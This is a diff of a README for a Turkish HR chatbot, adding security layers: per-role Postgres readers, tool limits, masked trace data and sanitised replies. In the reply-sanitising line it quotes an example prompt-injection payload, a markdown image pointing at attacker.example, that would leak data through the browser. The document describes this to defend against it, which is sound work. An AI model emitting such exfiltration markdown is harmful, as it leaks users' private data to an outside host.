@@ -55,13 +55,15 @@ The LLM is never the security boundary. Access is enforced in code, in two layer
 - **Layer 2:** each tool calls the policy again before it queries and raises `PermissionError` on a mismatch.
 - Typed tool arguments (`date`, `team`, `name`, `limit`) and Turkish docstrings become the tool schema the model sees.
 - The system prompt makes the model answer only from tool results, and say only "Bu konuda bilgim yok." when it cannot. Today's date is added on each run, so "who is on leave today?" works.
+- Limits (unbounded consumption): `limit` is 1..50 and `months` 1..24 in the tool schema, `get_shifts` returns at most 50 rows, and a turn stops after 5 model requests with the normal refusal.
 - Multi-turn memory: the Pydantic AI message history is kept per chat and rebuilt from the database when an old chat is opened again.
 
 ### Database access
 
 - SQLAlchemy 2 models with a level per table (`TABLE_LEVELS`), an Alembic migration, and a seed script that fills fake Turkish company data with Faker (fixed seed, so runs repeat).
+- **Layer 3:** one Postgres user per role level, `reader_l1`, `reader_l2`, `reader_l3`, created by an Alembic migration. Each can `SELECT` only the tables at or below its level (`TABLE_LEVELS`), and a chat turn connects as the user of the role's level. So even a buggy tool cannot read salaries for a worker.
 - Two Postgres users, set up in `db/init.sql`:
-  - `tool_reader`: `SELECT` only on the `company` database. The agent's tools connect as this user.
+  - `tool_reader`: `SELECT` only on the `company` database (all tables). The tools no longer use it.
   - `chainlit`: owns a separate `chainlit` database for chat history. `tool_reader` cannot connect to it.
 - Tools build parameterised queries with SQLAlchemy; the model never writes SQL. Each call opens its own connection, because the agent can run tools in parallel.
 
@@ -74,6 +76,7 @@ The LLM is never the security boundary. Access is enforced in code, in two layer
 ### Chat UI and history
 
 - Chainlit chat with persistent history in Postgres (`SQLAlchemyDataLayer`): past chats show in the sidebar and can be continued.
+- Every reply is sanitised before it is shown: markdown images and link targets are removed, so an injected `![x](https://attacker.example/?d=...)` cannot leak data through the browser.
 - **Developer mode** (settings switch) adds a "Karar paneli" message under each answer: role, guardrail result, tools offered, tools called.
 
 ### Observability (Langfuse)
@@ -81,6 +84,7 @@ The LLM is never the security boundary. Access is enforced in code, in two layer
 - Each chat turn is one trace, tagged `rol:<role>`, with the user and session id.
 - The guardrail step, every LLM call and every tool call show up as child spans (`Agent.instrument_all()`).
 - Each trace gets a `guardrail_blocked` score (0 or 1), so blocked turns can be filtered and counted.
+- Level-3 data is masked before export (`mask_otel_spans`): spans that carry a salary or financial tool result, or an answer built from one, keep their structure but not their content.
 - Tracing turns off by itself when Langfuse keys are empty.
 
 ### Tests
